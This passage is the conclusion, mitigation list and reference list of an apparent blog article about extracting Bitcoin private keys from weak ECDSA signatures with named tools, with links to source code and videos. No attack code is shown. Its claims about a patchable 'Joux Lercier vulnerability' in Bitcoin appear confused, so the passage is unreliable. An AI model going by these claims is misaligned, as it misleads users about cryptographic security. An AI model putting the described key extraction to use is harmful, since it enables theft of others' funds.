<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-31(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5079"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Conclusion and mitigation measures:</h2>



<p>In this article, we explored methods for recovering lost cryptocurrency wallets and private keys using mathematical algorithms such as discrete logarithm and Hidden&nbsp;<strong>Number Problem . We demonstrated how to use&nbsp;</strong><strong>Dockeyhunt Discrete Logarithm, DarkSignature,</strong>&nbsp;and&nbsp;<strong>Perelman Work</strong>&nbsp;software&nbsp;to extract private keys from vulnerable transactions using the ECDSA algorithm. Our research showed that even secure systems such as Bitcoin have vulnerabilities that can be exploited to regain access to lost funds. The recovery process requires deep knowledge of cryptography and mathematics, as well as skills in working with specialized software.</p>



<p>To protect against threats related to the Joux Lercier vulnerability, users should take the following steps:</p>



<ol class="wp-block-list">
<li><strong>Software Updates</strong>&nbsp;: Regularly updating your cryptocurrency wallets to patched versions is critical to maintaining security.</li>



<li><strong>Improved signature verification mechanisms</strong>&nbsp;: Stronger input validation and error handling will help prevent the creation of fake signatures and protect users’ private keys.</li>



<li><strong>Network activity monitoring</strong>&nbsp;: Constant analysis of network status and early detection of suspicious transactions allow for prompt response to attempts to exploit vulnerabilities.</li>



<li><strong>Implementing Multi-Factor Authentication</strong>&nbsp;: Implementing additional cryptographic security methods will significantly improve security.</li>
</ol>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>To prevent possible attacks related to the Joux Lercier vulnerability, Bitcoin users are strongly advised to update their wallet software to the latest versions that fix this vulnerability. Regular software updates, the implementation of anomaly detection systems, and increased user awareness of possible threats will help maintain the integrity and security of cryptocurrency systems.</p>
</blockquote>



<p>The vulnerability of the Joux Lercier algorithm poses a significant threat to the security of cryptocurrency transactions and the integrity of the blockchain. To minimize risks, users should regularly update their software, implement strict security measures, and constantly monitor the network status. These measures will help maintain the security and stability of cryptocurrency systems, protecting users from potential threats and financial losses.</p>



<p>The results of our study highlight the importance of mathematical analysis in the cryptocurrency space and demonstrate the potential for using complex mathematical methods to solve real-world cryptanalysis problems. However, it is important to note that such methods can be used both to restore access to lost funds and to exploit vulnerabilities, highlighting the need to improve the security of cryptocurrency systems.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">References:</h2>



<ol class="wp-block-list">
<li><em><strong><a href="https://cryptodeeptech.ru/doc/12oliver.pdf" target="_blank" rel="noreferrer noopener">The impact of the number field sieve on the discrete logarithm problem in finite fields</a></strong>&nbsp;OLIVER SCHIROKAUER</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/16_GuillevicMorain_Chapter9_DiscreteLogarithms.pdf" target="_blank" rel="noreferrer noopener">Discrete Logarithms</a></strong>&nbsp;Aurore Guillevic, François Morain</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/19_Rennes_STNFS.pdf" target="_blank" rel="noreferrer noopener">Discrete logarithm computation in finite fields Fp n with NFS variants and consequences in pairing-based cryptography</a></strong>&nbsp;Aurore Guillevic Inria Nancy, Caramba team</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/1c-dlp-ecdsa.pdf" target="_blank" rel="noreferrer noopener">Discrete logarithm problem (DLP) &amp; ECDSA</a></strong>&nbsp;Many slides are from Rong-Jaye Chen@NCTU</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/2017-1113.pdf" target="_blank" rel="noreferrer noopener">The Discrete-Logarithm Problem with Preprocessing</a></strong>&nbsp;Henry Corrigan-Gibbs and Dmitry Kogan Stanford University August 3, 2021</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/2023-834.pdf" target="_blank" rel="noreferrer noopener">Discrete Logarithm Factory</a></strong>&nbsp;Haetham Al Aswada , Emmanuel Thomé and Cécile Pierrot University of Lorraine, CNRS, Inria, LORIA, Nancy, France</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/609.pdf" target="_blank" rel="noreferrer noopener">On the discrete logarithm problem for prime-field elliptic curves</a></strong>&nbsp;Citation for published version (APA): Amadori, A. G., Pintore, F., &amp; Sala, M. (2018)</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/An_evaluation_of_the_discrete_logarithm_cryptosyst.pdf" target="_blank" rel="noreferrer noopener">An evaluation of the discrete logarithm cryptosystem</a></strong>&nbsp;Yansheng Chen Kristin School, Auckland, New Zealand</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/BaCaMa05.pdf" target="_blank" rel="noreferrer noopener">Efficient Proofs Of Knowledge of Discrete Logarithms and Representations in Groups with Hidden Order</a></strong>&nbsp;Endre Bangerter , Jan Camenisch , and Ueli Maurer IBM Research, Zurich Research Lab, CH-8803 Rueschlikon, Switzerland Departement of Computer Science, ETH Zurich, CH-8092 Zurich, Switzerland</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/CamSta97b.pdf" target="_blank" rel="noreferrer noopener">Proof Systems for General Statements about Discrete Logarithms</a></strong>&nbsp;Jan Camenisch Dept. of Computer Science Haldeneggsteig 4 ETH Zurich CH-8092 Zurich, Switzerland Markus Stadler Union Bank of Switzerland Ubilab Bahnhofstrasse 45 CH-8021 Zurich, Switzerland</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/CDHandDLP.pdf" target="_blank" rel="noreferrer noopener">Evidence that the Diffie-Hellman Problem is as Hard as Computing Discrete Logs</a></strong>&nbsp;Jonah Brown-Cohen</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/2008-437.pdf" target="_blank" rel="noreferrer noopener">Divisibility, Smoothness and Cryptographic Applications</a></strong>&nbsp;David Naccache Equipe de cryptographie ´ Ecole normale sup´erieure ´ 45 rue d’Ulm, F-75230 Paris, Cedex 05, France Igor E. Shparlinski Department of Computing Macquarie University Sydney, NSW 2109, Australia October 17, 2008</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/cdls-africacrypt.pdf" target="_blank" rel="noreferrer noopener">CDLS: Proving Knowledge of Committed Discrete Logarithms with Soundness</a></strong>&nbsp;Sofia Celi , Shai Levin , and Joe Rowell Brave Software, University of Auckland, Royal Holloway, University of London</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/ch13.pdf" target="_blank" rel="noreferrer noopener">Basic Discrete Logarithm Algorithms “Mathematics of Public Key Cryptography”</a></strong>&nbsp;by Steven Galbraith</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/cuberoot-20120919.pdf" target="_blank" rel="noreferrer noopener">Computing small discrete logarithms faster</a></strong>&nbsp;Daniel J. Bernstein and Tanja Lange Department of Computer Science University of Illinois at Chicago, Chicago, IL 60607–7053, USA Department of Mathematics and Computer Science Technische Universiteit Eindhoven, P.O. Box 513, 5600 MB Eindhoven, the Netherlands</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/Discrete%20Logarithms%20on%20Elliptic%20Curves.pdf" target="_blank" rel="noreferrer noopener">Discrete Logarithms on Elliptic Curves</a></strong>&nbsp;Aaron Blumenfeld University of Rochester</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/discretelogs2014.pdf" target="_blank" rel="noreferrer noopener">The Past, evolving Present and Future of Discrete Logarithm</a></strong>&nbsp;Antoine Joux, Andrew Odlyzko and Cécile Pierrot</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/discrete.logs.pdf" target="_blank" rel="noreferrer noopener">Discrete logarithms in finite fields and their cryptographic significance</a></strong>&nbsp;A. M. Odlyzko AT&amp;T Bell Laboratories Murray Hill, New Jersey</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/dlc.pdf" target="_blank" rel="noreferrer noopener">Discreet Log Contracts</a></strong>&nbsp;Thaddeus Dryja MIT Digital Currency Initiative</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/document.pdf" target="_blank" rel="noreferrer noopener">Solving a 676-bit Discrete Logarithm Problem in GF(36n)</a></strong>&nbsp;Takuya Hayashi , Naoyuki Shinohara , Lihua Wang, Shin’ichiro Matsuo , Masaaki Shirase, and Tsuyoshi Takagi Future University Hakodate, Japan. National Institute of Information and Communications Technology, Japan.</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/ECDSA-Security-in-Bitcoin-and-Ethereum-a-Research-Survey.pdf" target="_blank" rel="noreferrer noopener">ECDSA Security in Bitcoin and Ethereum: a Research Survey</a></strong>&nbsp;Hartwig Mayer CoinFabrik Revised June 28, 2016</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/EdwardsBitcoinFinal-V3.pdf" target="_blank" rel="noreferrer noopener">Bitcoin Security with a Twisted Edwards Curve</a></strong>&nbsp;Meryem Cherkaoui Semmouni, Abderrahmane Nitaj, Mostafa Belkasmi</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/glnq.pdf" target="_blank" rel="noreferrer noopener">The Discrete Logarithm Problem in GL(n, q)</a></strong>&nbsp;Alfred J. Menezes and Yi-Hong Wu Dept. of Discrete and Statistical Sciences 120 Math Annex Auburn University</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/HPL-97-128.pdf" target="_blank" rel="noreferrer noopener">The Discrete Logarithm Problem on Elliptic Curves of Trace One</a></strong>&nbsp;Nigel P. Smart Network Systems Department HP Laboratories Bristol October, 1997</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/ijsrp-p7117.pdf" target="_blank" rel="noreferrer noopener">Elliptic Curve Digital Signatures and Their Application in the Bitcoin Crypto-currency Transactions&nbsp;</a></strong>Benjamin K. Kikwai 16 October 2017</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/mathematics_of_bitcoin_ecdsa_lmc.pdf" target="_blank" rel="noreferrer noopener">Mathematics of Bitcoin: The ECDSA</a></strong>&nbsp;by Lewis Combes MA4K8 Scholarly Report Submitted to The University of Warwick Mathematics Institute April, 2018</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/MS2-13411505.pdf" target="_blank" rel="noreferrer noopener">Discrete Logarithm in Galois Rings</a></strong>&nbsp;Samuel Bertrand Liyimbeme Mouchili African Institute for Mathematical Sciences (AIMS)-Cameroon alumnus, Cameroon</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/Oyono2009.pdf" target="_blank" rel="noreferrer noopener">The discrete logarithm problem and its application in Cryptography</a></strong>&nbsp;Roger Oyono University of French Polynesia, Tahiti Lectures in Cryptography for Master class Madrid, April 2009</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/schoof2016.pdf" target="_blank" rel="noreferrer noopener">The Discrete Logarithm Problem</a></strong>&nbsp;Rene Schoof</em></li>



<li><strong><em><a href="https://cryptodeeptech.ru/doc/smith1.pdf" target="_blank" rel="noreferrer noopener">Asymmetric cryptography from discrete logarithms</a></em></strong>&nbsp;<em>Benjamin Smith Summer school on real-world crypto and privacy Sibenik, Croatia // June 17 2019</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/takhanov24a.pdf" target="_blank" rel="noreferrer noopener">Intractability of Learning the Discrete Logarithm with Gradient-Based Methods</a></strong>&nbsp;Rustem Takhanov Maxat Tezekbayev Artur Pak Department of Mathematics, Nazarbayev University, Astana, Kazakhstan Arman Bolatov Department of Computer Science, Nazarbayev University, Astana, Kazakhstan Zhibek Kadyrsizova Department of Mathematics, Nazarbayev University, Astana, Kazakhstan Zhenisbek Assylbekov Department of Mathematical Sciences, Purdue University Fort Wayne, Fort Wayne, IN, USA</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/talk-78.pdf" target="_blank" rel="noreferrer noopener">Discrete Logarithms in Cryptography</a></strong>&nbsp;Frederik Vercauteren ESAT/COSIC — KU Leuven ECRYPT Summer School 2008</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/Winkler.pdf" target="_blank" rel="noreferrer noopener">THE DISCRETE LOG PROBLEM AND ELLIPTIC CURVE CRYPTOGRAPHY</a></strong>&nbsp;NOLAN WINKLER</em></li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://dzen.ru/video/watch/6784be61b09e46422395c236"><img loading="lazy" decoding="async" width="646" height="371" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-10(1).png" alt="Discrete Logarithms" class="wp-image-3151" style="width:509px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-10.png 646w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-10-300x172.png 300w" sizes="auto, (max-width: 646px) 100vw, 646px"></a></figure></div>


<p class="has-text-align-center"><iframe loading="lazy" width="480" height="270" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/vIN4t1u38O1U.html" allow="autoplay; fullscreen; accelerometer; gyroscope; picture-in-picture; encrypted-media" data-testid="embed-iframe" frameborder="0" scrolling="no" allowfullscreen=""></iframe></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>This material was created for the&nbsp;&nbsp;<a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>&nbsp;portal &nbsp;to ensure financial data security and cryptography on elliptic curves&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1</a>&nbsp;&nbsp;against weak&nbsp;&nbsp;<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>&nbsp;signatures &nbsp;in the&nbsp;&nbsp;<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">BITCOIN</a>&nbsp;cryptocurrency . The creators of the software are not responsible for the use of materials.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/37DiscreteLogarithm" target="_blank" rel="noreferrer noopener">Source code</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/i9KYih_ffr8" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/i9KYih_ffr8</a></strong></p>



<p><strong><a href="https://dzen.ru/video/watch/6784be61b09e46422395c236" target="_blank" rel="noreferrer noopener">Video tutorial: https://dzen.ru/video/watch/6784be61b09e46422395c236</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/discrete-logarithm" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/discrete-logarithm</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/GOLD1031B-1024x576.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5107"></figure>
	</div><!-- .entry-content -->

